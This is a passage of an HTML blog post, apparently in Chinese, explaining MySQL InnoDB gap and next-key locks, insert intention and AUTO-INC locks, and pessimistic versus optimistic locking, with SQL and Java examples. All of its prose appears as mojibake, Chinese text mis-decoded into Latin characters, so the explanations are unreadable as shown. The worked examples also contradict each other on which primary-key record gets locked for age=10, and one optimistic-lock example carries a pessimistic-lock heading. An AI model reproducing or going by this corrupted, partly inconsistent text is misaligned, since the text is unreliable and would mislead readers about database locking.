é”ä½çš„æ˜¯ç´¢å¼•è®°å½•ä¹‹é—´çš„å¼€åŒºé—´ï¼Œä¸åŒ…å«è®°å½•æœ¬èº«ã€‚</strong></p>\n<blockquote>\n<p>Gapä¹Ÿå¯ä»¥ç†è§£ä¸ºInnoDBçš„ç´¢å¼•æ•°æ®ç»“æ„ä¸­å¯ä»¥æ’å…¥æ–°å€¼çš„ä½ç½®ã€‚</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200736451-1804857824.png\" /></p>\n<p>ç¤ºä¾‹ï¼š</p>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE id = 7 FOR UPDATE;\n</code></pre>\n<p>ç”±äºç´¢å¼•è®°å½•ä¸å­˜åœ¨ï¼ŒåŠ Gap Lockï¼šåŒºé—´(5,10)ã€‚è¿™æ ·å°±èƒ½é˜²æ­¢å…¶ä»–äº‹åŠ¡åœ¨é—´éš™ä¸­æ’å…¥æ–°è®°å½•ã€‚</p>\n<h3 id=\"next-key-lock-ä¸´é”®é”\">Next Key Lock ï¼ˆä¸´é”®é”ï¼‰</h3>\n<p><strong>Next-Key Lockæ˜¯ç´¢å¼•è®°å½•ä¸Šçš„è®°å½•é”å’Œç´¢å¼•è®°å½•ä¹‹å‰é—´éš™ä¸Šçš„é—´éš™é”çš„ç»„åˆã€‚</strong><br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200803021-1764134796.png\" /></p>\n<p>å·¥ä½œç¤ºä¾‹ï¼š</p>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE age = 10 FOR UPDATE;\n</code></pre>\n<p><strong>å¦‚æœä¸Šé¢è¿™ä¸ªSQLä¸­usersè¡¨çš„ageä¸ºæ™®é€šç´¢å¼•ï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™ä¸ªSQLçš„æ—¶å€™ï¼Œä¼šæ·»åŠ Next-Key Lockï¼Œå¹¶é”ä½ï¼ˆ5,10]è¿™ä¸ªèŒƒå›´ï¼Œå·¦å¼€å³é—­ã€‚ä¸»è¦æ˜¯å¯¹ageç´¢å¼•ï¼š(5,10]çš„Next-Key Lockï¼Œå¯¹ä¸»é”®ç´¢å¼•ï¼šid=10çš„è®°å½•é”</strong>ã€‚</p>\n<h3 id=\"åŠ é”è§„åˆ™ä¸æ—¶æœº\">åŠ é”è§„åˆ™ä¸æ—¶æœº</h3>\n<h4 id=\"åŠ é”åŸºæœ¬åŸåˆ™\">åŠ é”åŸºæœ¬åŸåˆ™ï¼š</h4>\n<ol>\n<li>æ‰€æœ‰é”éƒ½æ˜¯åŠ åœ¨ç´¢å¼•ä¸Šçš„ã€‚</li>\n<li>åŠ é”çš„åŸºæœ¬å•ä½æ˜¯ Next-Key Lockã€‚</li>\n<li>æŸ¥è¯¢è¿‡ç¨‹ä¸­è®¿é—®åˆ°çš„å¯¹è±¡éƒ½ä¼šåŠ é”ã€‚</li>\n<li>åŠ é”é¡ºåºæ˜¯ä»å·¦å‘å³ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªä¸æ»¡è¶³æ¡ä»¶çš„è®°å½•ã€‚</li>\n</ol>\n<blockquote>\n<p>è¿™äº›é”éƒ½æ˜¯MySQLçš„InnoDBè‡ªåŠ¨åŠ ä¸Šçš„ï¼Œä¸éœ€è¦ç”¨æˆ·æ‰‹åŠ¨æ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨æ—¥å¸¸ä½¿ç”¨æ•°æ®åº“çš„æ—¶å€™è¦æ˜ç™½åŠ é”çš„åŸåˆ™ã€‚</p>\n</blockquote>\n<h4 id=\"ä¸åŒåœºæ™¯çš„åŠ é”è§„åˆ™\">ä¸åŒåœºæ™¯çš„åŠ é”è§„åˆ™ï¼š</h4>\n<ol>\n<li><strong>ç­‰å€¼æŸ¥è¯¢ (=)</strong><br />\n<strong>å”¯ä¸€ç´¢å¼•/ä¸»é”®</strong>ï¼šNext-Key Lock é€€åŒ–ä¸º Record Lock<br />\n<strong>æ™®é€šç´¢å¼•</strong>ï¼šä¿æŒ Next-Key Lockï¼Œå·¦å³é—´éš™éƒ½ä¸èƒ½ä¼˜åŒ–æ‰</li>\n<li><strong>èŒƒå›´æŸ¥è¯¢ (&gt;ã€&lt;ã€&gt;=ã€&lt;=)</strong><br />\n<strong>å”¯ä¸€ç´¢å¼•/ä¸»é”®</strong>ï¼šä¿æŒ Next-Key Lockï¼Œä¸è¿›è¡Œä¼˜åŒ–<br />\n<strong>æ™®é€šç´¢å¼•</strong>ï¼šåŒæ ·ä¿æŒ Next-Key Lock</li>\n<li><strong>è®°å½•ä¸å­˜åœ¨çš„æƒ…å†µ</strong><br />\nä¼šå¯¹æ‰«æåˆ°çš„ç¬¬ä¸€ä¸ªä¸æ»¡è¶³æ¡ä»¶çš„è®°å½•åŠ  Gap Lock</li>\n</ol>\n<h4 id=\"å·¥ä½œåœºæ™¯ç¤ºä¾‹\">å·¥ä½œåœºæ™¯ç¤ºä¾‹</h4>\n<p>ä¾‹å¦‚æœ‰ä¸€ä¸ªusersè¡¨å­—æ®µä¸ç°æœ‰æ•°æ®å¦‚ä¸‹è¡¨æ‰€ç¤º</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>age</th>\n<th>name</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>5</td>\n<td>Tom</td>\n</tr>\n<tr>\n<td>5</td>\n<td>10</td>\n<td>Jack</td>\n</tr>\n<tr>\n<td>10</td>\n<td>15</td>\n<td>Rose</td>\n</tr>\n<tr>\n<td>15</td>\n<td>20</td>\n<td>Mike</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"åœºæ™¯ä¸€ç­‰å€¼æŸ¥è¯¢å”¯ä¸€ç´¢å¼•\">åœºæ™¯ä¸€ï¼šç­‰å€¼æŸ¥è¯¢ï¼ˆå”¯ä¸€ç´¢å¼•ï¼‰</h5>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE id = 5 FOR UPDATE;\n</code></pre>\n<p>åŠ é”æƒ…å†µï¼š</p>\n<ul>\n<li>ç”±äºidæ˜¯ä¸»é”®ï¼ˆå”¯ä¸€ç´¢å¼•ï¼‰ï¼ŒNext-Key Locké€€åŒ–ä¸ºRecord Lock</li>\n<li>åªåœ¨id=5çš„è®°å½•ä¸ŠåŠ Xå‹è®°å½•é”</li>\n</ul>\n<h5 id=\"åœºæ™¯äºŒç­‰å€¼æŸ¥è¯¢æ™®é€šç´¢å¼•\">åœºæ™¯äºŒï¼šç­‰å€¼æŸ¥è¯¢ï¼ˆæ™®é€šç´¢å¼•ï¼‰</h5>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE age = 10 FOR UPDATE;\n</code></pre>\n<p>åŠ é”æƒ…å†µï¼š</p>\n<ul>\n<li>å¯¹ageç´¢å¼•ï¼š(5,10]çš„Next-Key Lock</li>\n<li>å¯¹ä¸»é”®ç´¢å¼•ï¼šid=5çš„è®°å½•é”</li>\n<li>å› ä¸ºæ˜¯æ™®é€šç´¢å¼•ï¼Œé—´éš™ä¸èƒ½è¢«ä¼˜åŒ–æ‰</li>\n</ul>\n<h5 id=\"åœºæ™¯ä¸‰èŒƒå›´æŸ¥è¯¢\">åœºæ™¯ä¸‰ï¼šèŒƒå›´æŸ¥è¯¢</h5>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE id &gt; 5 AND id &lt;= 15 FOR UPDATE;\n</code></pre>\n<p>åŠ é”æƒ…å†µï¼š</p>\n<ul>\n<li>(5,10]çš„Next-Key Lock</li>\n<li>(10,15]çš„Next-Key Lock</li>\n<li>(15,20]çš„Next-Key Lockï¼ˆä¼šæ‰«æåˆ°ç¬¬ä¸€ä¸ªä¸æ»¡è¶³æ¡ä»¶çš„è®°å½•ï¼‰</li>\n</ul>\n<h5 id=\"åœºæ™¯å››è®°å½•ä¸å­˜åœ¨çš„æƒ…å†µ\">åœºæ™¯å››ï¼šè®°å½•ä¸å­˜åœ¨çš„æƒ…å†µ</h5>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE id = 7 FOR UPDATE;\n</code></pre>\n<p>åŠ é”æƒ…å†µï¼š<strong>ç”±äºè®°å½•ä¸å­˜åœ¨ï¼ŒåŠ Gap Lockï¼š(5,10)</strong></p>\n<h4 id=\"ä¸åŒéš”ç¦»çº§åˆ«ä¸‹å¯åŠ é”çš„è¡Œä¸º\">ä¸åŒéš”ç¦»çº§åˆ«ä¸‹å¯åŠ é”çš„è¡Œä¸º</h4>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120200957494-294883624.png\" /></p>\n<h3 id=\"æ’å…¥æ„å‘é”insert-intention-lock\">æ’å…¥æ„å‘é”ï¼ˆInsert Intention Lockï¼‰</h3>\n<p><strong>æ’å…¥æ„å‘é”æ˜¯ä¸€ç§ç‰¹æ®Šçš„é—´éš™é”ï¼Œè¡¨ç¤ºäº‹åŠ¡è®¡åˆ’åœ¨æŸä¸ªé—´éš™æ’å…¥æ•°æ®çš„æ„å›¾ã€‚</strong></p>\n<p>è¿™ç§é”è¡¨æ˜äº†æ’å…¥çš„æ„å›¾ï¼Œä»¥è¿™æ ·ä¸€ç§æ–¹å¼ï¼Œå¦‚æœå¤šä¸ªäº‹åŠ¡æ’å…¥åˆ°åŒä¸€ç´¢å¼•é—´éš™ä¸­ä½†ä¸åœ¨é—´éš™å†…çš„ç›¸åŒä½ç½®æ’å…¥ï¼Œåˆ™å®ƒä»¬ä¸éœ€è¦ç›¸äº’ç­‰å¾…ã€‚</p>\n<p>å‡è®¾æœ‰ç´¢å¼•è®°å½•çš„å€¼ä¸º4å’Œ7ã€‚åˆ†åˆ«å°è¯•æ’å…¥å€¼ä¸º5å’Œ6çš„ä¸åŒäº‹åŠ¡ï¼Œåœ¨è·å–æ’å…¥è¡Œçš„ç‹¬å é”ä¹‹å‰ï¼Œå„è‡ªç”¨æ’å…¥æ„å‘é”é”å®š4å’Œ7ä¹‹é—´çš„é—´éš™ï¼Œä½†ç”±äºè¡Œä¸å†²çªï¼Œæ‰€ä»¥å®ƒä»¬ä¸ä¼šç›¸äº’é˜»å¡ã€‚ä½†æ˜¯å¦‚æœä»–ä»¬çš„éƒ½è¦æ’å…¥6ï¼Œé‚£ä¹ˆå°±ä¼šéœ€è¦é˜»å¡äº†ã€‚</p>\n<p>æ’å…¥æ„å‘é”ï¼Œæ˜¯ä¸€ç§ä¼˜åŒ–åçš„é—´éš™é”ï¼Œä¸»è¦ç›®çš„æ˜¯<strong>ä¼˜åŒ–å¹¶å‘ï¼Œå…è®¸ä¸å†²çªçš„æ’å…¥</strong>ã€‚å®ƒä¸é—´éš™é”é…åˆä½¿ç”¨ï¼Œæ—¢é˜²æ­¢äº†å¹»è¯»åˆæå‡äº†å¹¶å‘ã€‚</p>\n<blockquote>\n<p>è™½ç„¶è¿™ä¸ªé”çš„åå­—å«æ’å…¥æ„å‘é”ï¼Œä½†æ˜¯å®ƒæ˜¯è¡Œçº§é”ï¼Œè·Ÿæ„å‘é”è¿™ä¸ªè¡¨çº§é”ï¼Œæ˜¯æ²¡ä»€ä¹ˆå…³ç³»çš„ã€‚</p>\n</blockquote>\n<h3 id=\"auto-inc-é”\">AUTO-INC é”</h3>\n<p>AUTO-INCé”æ˜¯ä¸€ç§ç‰¹æ®Šçš„è¡¨çº§é”ï¼Œç”±æ’å…¥å¸¦æœ‰AUTOINCREMENT åˆ—çš„è¡¨çš„äº‹åŠ¡è·å–ã€‚<br />\nåœ¨æœ€ç®€å•çš„æƒ…å†µä¸‹.å¦‚æœä¸€ä¸ªäº‹åŠ¡æ­£åœ¨å‘è¡¨ä¸­æ’å…¥å€¼ï¼Œä»»ä½•å…¶ä»–äº‹åŠ¡éƒ½å¿…é¡»ç­‰å¾…ï¼Œä»¥ä¾¿æ‰§è¡Œå®ƒä»¬è‡ªå·±çš„æ’å…¥æ“ä½œï¼Œè¿™æ ·ç¬¬ä¸€ä¸ªäº‹åŠ¡æ’å…¥çš„è¡Œå°±ä¼šæ¥æ”¶åˆ°è¿ç»­çš„ä¸»é”®å€¼ã€‚</p>\n<p>æœ€ä¸»è¦æ˜¯<strong>ç”¨äºä¿æŠ¤AUTO_INCREMENTåˆ—çš„è‡ªå¢å€¼ç”Ÿæˆè¿‡ç¨‹ï¼Œç¡®ä¿å¹¶å‘æ’å…¥æ—¶è‡ªå¢å€¼çš„å”¯ä¸€æ€§å’Œè¿ç»­æ€§ï¼Œé˜²æ­¢å¤šä¸ªäº‹åŠ¡ç”Ÿæˆç›¸åŒçš„è‡ªå¢å€¼</strong></p>\n<p>åˆ†ä¸‰ç§é”æ¨¡å¼ï¼š<br />\né€šè¿‡å‚æ•° <code>innodb_autoinc_lock_mode</code> æ§åˆ¶ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>æ¨¡å¼</th>\n<th>å€¼</th>\n<th>æè¿°</th>\n<th>ç‰¹ç‚¹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>ä¼ ç»Ÿæ¨¡å¼</strong></td>\n<td>0</td>\n<td>è¡¨çº§é”</td>\n<td>å®‰å…¨æ€§æœ€é«˜ï¼Œæ€§èƒ½æœ€ä½</td>\n</tr>\n<tr>\n<td><strong>è¿ç»­æ¨¡å¼</strong></td>\n<td>1</td>\n<td>è½»é‡çº§äº’æ–¥é”</td>\n<td>å¹³è¡¡å®‰å…¨æ€§å’Œæ€§èƒ½</td>\n</tr>\n<tr>\n<td><strong>æ— é”æ¨¡å¼</strong></td>\n<td>2</td>\n<td>é¢„å…ˆåˆ†é…è‡ªå¢å€¼</td>\n<td>æ€§èƒ½æœ€é«˜ï¼Œå¯èƒ½ä¸è¿ç»­</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"æ‚²è§‚é”\">æ‚²è§‚é”</h3>\n<p>æ•°æ®åº“ä¸­çš„é”ï¼ŒæŒ‰ç…§ä½¿ç”¨æ–¹å¼æ¥åˆ†ï¼Œä¹Ÿå¯åˆ†ä¸º<strong>æ‚²è§‚é”</strong>å’Œ<strong>ä¹è§‚é”</strong>ã€‚</p>\n<p>æ‚²è§‚é”çš„æ ¸å¿ƒæ€æƒ³ï¼š<strong>\"æ‚²è§‚\"åœ°è®¤ä¸ºæ•°æ®ä¸€å®šä¼šè¢«å…¶ä»–äº‹åŠ¡ä¿®æ”¹ï¼Œæ‰€ä»¥æå‰åŠ é”</strong>ã€‚æ‰€ä»¥åœ¨æ“ä½œæ—¶æ˜¯å…ˆè·å–é”ï¼Œå†è¿›è¡Œä¸šåŠ¡æ“ä½œã€‚å£è¯€å°±æ˜¯â€œ<strong>ä¸€é”äºŒæŸ¥ä¸‰æ›´æ–°</strong>â€ã€‚</p>\n<h4 id=\"æ‚²è§‚é”ç¤ºä¾‹è¡Œçº§é”\">æ‚²è§‚é”ç¤ºä¾‹ï¼ˆè¡Œçº§é”ï¼‰</h4>\n<pre><code class=\"language-sql\">-- æ‚²è§‚é”ç¤ºä¾‹\nSTART TRANSACTION;\n\nSELECT * FROM products WHERE id = 1 FOR UPDATE;  -- åŠ æ’ä»–é”\nUPDATE products SET stock = stock - 1 WHERE id = 1;\n\nCOMMIT;\n</code></pre>\n<p>åœ¨å¯¹id=1çš„è®°å½•ä¿®æ”¹å‰ï¼Œå…ˆé€šè¿‡for updateçš„æ–¹å¼è¿›è¡ŒåŠ é”ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹ã€‚è¿™å°±æ˜¯æ¯”è¾ƒå…¸å‹çš„æ‚²è§‚é”ç­–ç•¥ã€‚</p>\n<p>å¦‚æœä»¥ä¸Šä¿®æ”¹åº“å­˜çš„ä»£ç å‘ç”Ÿå¹¶å‘ï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¼€å¯äº‹åŠ¡å¹¶è·å¾—id=1çš„é”ï¼Œå…¶å®ƒçš„äº‹åŠ¡å¿…é¡»ç­‰æœ¬æ¬¡äº‹åŠ¡æäº¤ä¹‹åæ‰èƒ½æ‰§è¡Œã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥ä¿è¯å½“å‰çš„æ•°æ®ä¸ä¼šè¢«å…¶å®ƒäº‹åŠ¡ä¿®æ”¹ã€‚</p>\n<h4 id=\"æ‚²è§‚é”ç¤ºä¾‹è¡¨çº§é”\">æ‚²è§‚é”ç¤ºä¾‹ï¼ˆè¡¨çº§é”ï¼‰</h4>\n<pre><code class=\"language-sql\">-- è¡¨çº§é”\nLOCK TABLES products WRITE;\n-- æ‰§è¡Œä¸šåŠ¡æ“ä½œ\n......\n-- è¡¨è§£é”\nUNLOCK TABLES;\n</code></pre>\n<p>å½“å¯¹productsè¡¨è¿›è¡Œæ“ä½œçš„æ—¶å€™ï¼Œä¼šå…ˆå¯¹è¡¨åŠ ä¸Šé”ï¼Œç„¶åå†æ“ä½œã€‚è¿™æ ·å…¶ä»–ä¸šåŠ¡å°±ä¸å¯ä»¥åœ¨å¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹äº†ã€‚ä½“ç°äº†æ‚²è§‚çš„æ€æƒ³ï¼Œä¸šåŠ¡ä½¿ç”¨æ–¹æ„Ÿè§‰â€œæ€»æœ‰åˆæ°‘æƒ³è°‹å®³æœ•â€ï¼ŒåŠ äº†é”ä¹‹åå®‰å…¨æ„Ÿæš´å¢ï¼</p>\n<h4 id=\"æ‚²è§‚é”å®é™…åœºæ™¯ç¤ºä¾‹-é‡‘èäº¤æ˜“è½¬è´¦åœºæ™¯\">æ‚²è§‚é”å®é™…åœºæ™¯ç¤ºä¾‹-é‡‘èäº¤æ˜“ï¼ˆè½¬è´¦åœºæ™¯ï¼‰</h4>\n<pre><code class=\"language-sql\">-- è½¬è´¦æ“ä½œï¼šä»è´¦æˆ·Aè½¬100å…ƒåˆ°è´¦æˆ·B\nSTART TRANSACTION;\n\n-- é”å®šä»˜æ¬¾æ–¹è´¦æˆ·\nSELECT balance FROM accounts WHERE id = 1 FOR UPDATE;\n-- ä¸šåŠ¡éœ€å…ˆæ£€æŸ¥balanceçš„ä½™é¢æ˜¯å¦å¤§äºç­‰äº100ï¼Œç„¶åå†æ‰§è¡Œæ‰£å‡\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\n\n-- é”å®šæ”¶æ¬¾æ–¹è´¦æˆ·  \nSELECT balance FROM accounts WHERE id = 2 FOR UPDATE;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\n\nCOMMIT;\n</code></pre>\n<h4 id=\"æ‚²è§‚é”å®é™…åœºæ™¯ç¤ºä¾‹-åº“å­˜æ‰£å‡é˜²æ­¢è¶…å–\">æ‚²è§‚é”å®é™…åœºæ™¯ç¤ºä¾‹-åº“å­˜æ‰£å‡ï¼ˆé˜²æ­¢è¶…å–ï¼‰</h4>\n<pre><code class=\"language-sql\">-- å•†å“åº“å­˜æ‰£å‡\nSTART TRANSACTION;\n\nSELECT stock FROM products WHERE id = 1 FOR UPDATE;\n\n-- æ£€æŸ¥åº“å­˜æ˜¯å¦å……è¶³\n-- å¦‚æœå……è¶³åˆ™æ‰£å‡\nUPDATE products SET stock = stock - 1 WHERE id = 1;\n\nCOMMIT;\n</code></pre>\n<h3 id=\"ä¹è§‚é”\">ä¹è§‚é”</h3>\n<p><strong>ä¹è§‚é”æ€»æ˜¯\"ä¹è§‚\"åœ°è®¤ä¸ºæ•°æ®ä¸ä¼šè¢«å…¶ä»–äº‹åŠ¡ä¿®æ”¹ï¼Œä¸åŠ é”ç›´æ¥æ“ä½œã€‚<br />\nä¼šå…ˆè¿›è¡Œæ“ä½œï¼Œæäº¤æ—¶æ£€æŸ¥æ˜¯å¦å‘ç”Ÿå†²çªã€‚ä¸»è¦é€šè¿‡ç‰ˆæœ¬å·ã€æ—¶é—´æˆ³ç­‰æ–¹å¼æ£€æµ‹å†²çªã€‚</strong></p>\n<blockquote>\n<p>MySQL æœ¬èº«ä¸æä¾›å†…ç½®ä¹è§‚é”ï¼Œéœ€è¦ç”¨æˆ·åœ¨è¡¨ç»“æ„è®¾è®¡æˆ–åº”ç”¨å±‚é€šè¿‡ CAS æ€æƒ³è‡ªè¡Œå®ç°ã€‚CASæœ¬è´¨å°±æ˜¯ä¸€é¡¹ä¹è§‚é”æŠ€æœ¯ï¼Œå½“å¤šä¸ªçº¿ç¨‹å°è¯•ä½¿ç”¨CASåŒæ—¶æ›´æ–°åŒä¸€ä¸ªå˜é‡æ—¶ï¼Œåªæœ‰å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹èƒ½æ›´æ–°å˜é‡çš„å€¼ï¼Œè€Œå…¶å®ƒçº¿ç¨‹éƒ½å¤±è´¥ï¼Œå¤±è´¥çš„çº¿ç¨‹å¹¶ä¸ä¼šè¢«æŒ‚èµ·ï¼Œè€Œæ˜¯è¢«å‘ŠçŸ¥è¿™æ¬¡ç«äº‰ä¸­å¤±è´¥ï¼Œå¹¶å¯ä»¥å†æ¬¡å°è¯•ã€‚</p>\n</blockquote>\n<h4 id=\"æ‚²è§‚é”ç¤ºä¾‹\">æ‚²è§‚é”ç¤ºä¾‹</h4>\n<pre><code class=\"language-sql\">-- 1. æŸ¥è¯¢æ•°æ®æ—¶è·å–ç‰ˆæœ¬å·\nSELECT id, name, stock, version FROM products WHERE id = 1;\n\n-- 2. æ›´æ–°æ—¶æ£€æŸ¥ç‰ˆæœ¬å·\nUPDATE products \nSET stock = stock - 1, version = version + 1 \nWHERE id = 1 AND version = æ—§ç‰ˆæœ¬å·;\n\n-- 3. æ£€æŸ¥æ›´æ–°æ˜¯å¦æˆåŠŸ\n-- å¦‚æœ update æˆåŠŸè®°å½•æ•°ä¸º0ï¼Œè¯´æ˜æ•°æ®è¢«å…¶ä»–äº‹åŠ¡ä¿®æ”¹ï¼Œç‰ˆæœ¬å·å·²ç»ä¸å†è¯•ç¬¬ä¸€æ­¥æŸ¥å‡ºæ¥çš„é‚£ä¸ªç‰ˆæœ¬å·äº†ã€‚\n</code></pre>\n<p>å®Œæ•´çš„ç¤ºä¾‹</p>\n<pre><code class=\"language-sql\">-- åˆ›å»ºå¸¦æœ‰ç‰ˆæœ¬å·çš„è¡¨\nCREATE TABLE products (\n    id INT PRIMARY KEY,\n    name VARCHAR(50),\n    stock INT,\n    version INT DEFAULT 1\n);\n\n-- ä¹è§‚é”æ›´æ–°è¿‡ç¨‹\nSTART TRANSACTION;\n\n-- æ­¥éª¤1ï¼šè¯»å–æ•°æ®å’Œç‰ˆæœ¬å·\nSELECT id, stock, version FROM products WHERE id = 1;\n-- å‡è®¾è·å–åˆ°ï¼šversion = 5, stock = 100\n\n-- æ­¥éª¤2ï¼šæ‰§è¡Œä¸šåŠ¡é€»è¾‘ï¼ˆåœ¨åº”ç”¨ç¨‹åºä¸­ï¼‰\n-- è®¡ç®—æ–°åº“å­˜ï¼šnew_stock = 100 - 1 = 99\n\n-- æ­¥éª¤3ï¼šæ›´æ–°æ•°æ®å¹¶æ£€æŸ¥ç‰ˆæœ¬å·\nUPDATE products \nSET stock = 99, version = 6 WHERE id = 1 AND version = 5;\n\n-- æ­¥éª¤4ï¼šæ£€æŸ¥æ›´æ–°ç»“æœ\n-- å¦‚æœ update æˆåŠŸè®°å½•æ•°ä¸º1ï¼Œæ›´æ–°æˆåŠŸ\n-- å¦‚æœ update æˆåŠŸè®°å½•æ•°ä¸º0ï¼Œæ•°æ®è¢«å…¶ä»–äº‹åŠ¡ä¿®æ”¹ï¼Œéœ€è¦é‡è¯•\n\nCOMMIT;\n</code></pre>\n<p>åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç›´æ¥ç”¨æ›´æ–°æ—¶é—´çš„æ—¶é—´æˆ³æ¥å®ç°ä¹è§‚é”ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-sql\">-- ä½¿ç”¨æ—¶é—´æˆ³å®ç°ä¹è§‚é”\n-- æŸ¥è¯¢å‡ºæ›´æ–°æ—¶é—´\nSELECT id, stock, updated_at FROM products WHERE id = 1;\n\n-- ç”¨æ›´æ–°æ—¶é—´æˆ³åšç‰ˆæœ¬å·ï¼Œå†å°†ç°åœ¨æ—¶é—´æ›´æ–°ä¸ºæœ€æ–°ç‰ˆæœ¬\nUPDATE products \nSET stock = stock - 1, updated_at = NOW() \nWHERE id = 1 AND updated_at = '2025-01-16 10:30:00';\n</code></pre>\n<p>åœ¨å®é™…ä¸šåŠ¡ä¸­é‡è¯•éƒ½æ˜¯åœ¨ä¸šåŠ¡å±‚å¤„ç†çš„ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-java\">// Javaä¸­çš„ä¹è§‚é”é‡è¯•æœºåˆ¶\npublic boolean updateProductStock(Long productId, int quantity) {\n    int maxRetries = 3;\n    \n    for (int i = 0; i &lt; maxRetries; i++) {\n        // 1. æŸ¥è¯¢æ•°æ®å’Œç‰ˆæœ¬å·\n        Product product = productMapper.selectById(productId);\n        \n        // 2. å°è¯•æ›´æ–°\n        int affectedRows = productMapper.updateStock(\n            productId, \n            product.getStock() - quantity,\n            product.getVersion()\n        );\n        \n        // 3. æ£€æŸ¥æ›´æ–°ç»“æœ\n        if (affectedRows &gt; 0) {\n            return true; // æ›´æ–°æˆåŠŸ\n        }\n        \n        // 4. æ›´æ–°å¤±è´¥ï¼ŒçŸ­æš‚ä¼‘çœ åé‡è¯•\n        Thread.sleep(100);\n    }\n    \n    return false; // é‡è¯•å¤šæ¬¡åä»ç„¶å¤±è´¥\n}\n</code></pre>\n<h3 id=\"æ‚²è§‚é”ä¸ä¹è§‚é”æ€»ç»“\">æ‚²è§‚é”ä¸ä¹è§‚é”æ€»ç»“</h3>\n<h4 id=\"æ‚²è§‚é”ä¸ä¹è§‚é”å¯¹æ¯”\">æ‚²è§‚é”ä¸ä¹è§‚é”å¯¹æ¯”</h4>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/772743/202601/772743-20260120201750503-2023940951.png\" /></p>\n<h4 id=\"æ‚²è§‚é”ä¸ä¹è§‚é”å®é™…ä½¿ç”¨ä¸­çš„é€‰å‹å»ºè®®\">æ‚²è§‚é”ä¸ä¹è§‚é”å®é™…ä½¿ç”¨ä¸­çš„é€‰å‹å»ºè®®</h4>\n<h5 id=\"æ‚²è§‚é”é€‚ç”¨åœºæ™¯\">æ‚²è§‚é”é€‚ç”¨åœºæ™¯</h5>\n<ul>\n<li>å†™æ“ä½œé¢‘ç¹ï¼ˆå†™å æ¯” &gt; 30%ï¼‰</li>\n<li>å†²çªæ¦‚ç‡é«˜çš„ä¸šåŠ¡</li>\n<li>ä¸´ç•ŒåŒºæ‰§è¡Œæ—¶é—´é•¿ï¼ˆåŒ…å«IOæ“ä½œï¼‰</li>\n<li>å¼ºä¸€è‡´æ€§è¦æ±‚ï¼ˆé‡‘èäº¤æ˜“ï¼‰</li>\n</ul>\n<h5 id=\"ä¹è§‚é”é€‚ç”¨åœºæ™¯\">ä¹è§‚é”é€‚ç”¨åœºæ™¯</h5>\n<ul>\n<li>è¯»æ“ä½œé¢‘ç¹ï¼ˆè¯»å æ¯” &gt; 80%ï¼‰</li>\n<li>å†²çªæ¦‚ç‡ä½çš„ä¸šåŠ¡</li>\n<li>ä¸´ç•ŒåŒºæ‰§è¡Œæ—¶é—´çŸ­ï¼ˆçº¯å†…å­˜æ“ä½œï¼‰</li>\n<li>ç³»ç»Ÿååé‡è¦æ±‚é«˜</li>\n<li>å¯ä»¥æ¥å—å¶å°”çš„é‡è¯•</li>\n</ul>\n<h5 id=\"åº”ç”¨æ¡ˆä¾‹\">åº”ç”¨æ¡ˆä¾‹</h5>\n<p>æ¡ˆä¾‹ä¸€ï¼šç”µå•†å•†å“åº“å­˜</p>\n<pre><code class=\"language-sql\">-- æ‚²è§‚é”æ–¹æ¡ˆï¼ˆé€‚åˆç§’æ€åœºæ™¯ï¼‰\nSTART TRANSACTION;\nSELECT stock FROM products WHERE id = 1 FOR UPDATE;\n\nIF (stock &gt; 0) THEN\n    UPDATE products SET stock = stock - 1 WHERE id = 1;\n    -- åˆ›å»ºè®¢å•...\nEND IF;\nCOMMIT;\n\n-- ä¹è§‚é”æ–¹æ¡ˆï¼ˆé€‚åˆæ™®é€šå•†å“ï¼‰\nUPDATE products \nSET stock = stock - 1, version = version + 1 \nWHERE id = 1 AND version = #{version} AND stock &gt; 0;\n\nIF (affected_rows = 1) THEN\n    -- åˆ›å»ºè®¢å•...\nELSE\n    -- åº“å­˜ä¸è¶³æˆ–ç‰ˆæœ¬å†²çªï¼Œæç¤ºç”¨æˆ·\nEND IF;\n</code></pre>\n<p>æ¡ˆä¾‹äºŒï¼šç”¨æˆ·è´¦æˆ·ä½™é¢</p>\n<pre><code class=\"language-sql\">-- æ‚²è§‚é”æ–¹æ¡ˆï¼ˆè½¬è´¦åœºæ™¯ï¼‰\nSTART TRANSACTION;\nSELECT balance FROM accounts WHERE id = 1 FOR UPDATE;\n\nIF (balance &gt;= amount) THEN\n    UPDATE accounts SET balance = balance - amount WHERE id = 1;\n    -- è®°å½•æµæ°´...\nEND IF;\nCOMMIT;\n\n-- ä¹è§‚é”æ–¹æ¡ˆï¼ˆç§¯åˆ†å…‘æ¢ï¼‰\nUPDATE accounts \nSET points = points - cost, version = version + 1 \nWHERE id = 1 \nAND version = #{version} \nAND points &gt;= cost;\n</code></pre>\n<h5 